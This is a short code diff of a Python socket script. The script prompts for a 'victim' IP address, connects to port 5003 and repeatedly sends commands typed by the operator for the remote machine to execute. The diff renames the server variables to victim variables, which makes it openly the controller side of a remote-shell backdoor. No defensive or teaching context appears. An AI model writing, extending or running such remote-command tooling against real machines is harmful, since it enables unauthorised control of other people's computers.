@@ -1,20 +1,20 @@
 import socket
-SERVER_HOST = "192.168.0.6"
-SERVER_PORT = 5003
+VICTIM_HOST = input("Enter IP of the victim:")
+VICTIM_PORT = 5003
 # send 1024 (1kb) a time (as buffer size)
 BUFFER_SIZE = 1024
 # create a socket object
 s = socket.socket()
 
 # connect to the server
-s.connect((SERVER_HOST, SERVER_PORT))
+s.connect((VICTIM_HOST, VICTIM_PORT))
 
 # receive the greeting message
 message = s.recv(BUFFER_SIZE).decode()
 print("Server:", message)
 
 while True:
-    # get the command from prompt
+    # get output from victim
     command = input("Enter the command you wanna execute:")
     # send the command to the client
     s.send(command.encode())
